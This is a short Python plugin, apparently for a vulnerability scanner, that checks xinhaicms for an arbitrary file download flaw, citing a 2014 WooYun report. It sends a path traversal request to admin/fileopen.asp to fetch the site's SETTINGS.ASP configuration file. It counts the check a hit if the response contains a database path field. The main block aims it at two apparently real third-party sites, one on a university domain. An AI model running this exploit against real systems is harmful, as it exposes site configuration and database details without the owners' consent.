#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:xinhaicms任意文件下载
#Refer:http://www.wooyun.org/bugs/wooyun-2014-060864


def assign(service,arg):
    if service=="xinhaisoft":
        return True,arg 
    


def  audit(arg):
    
    url=arg+"admin/fileopen.asp?filename=../inc/SETTINGS.ASP"
    code,head,res,errcode,finalurl=curl.curl2(url)
    if code==200 and  "pasdbpath" in res:
        security_hole('file download Vulnerable:'+url)

if __name__=="__main__":
    from dummy import *
    audit(assign('xinhaisoft','http://www.jsgyzx.net/xinhaisoft/')[1])
    audit(assign('xinhaisoft','http://www2.tsu.edu.cn/www/xinhaisoft/')[1])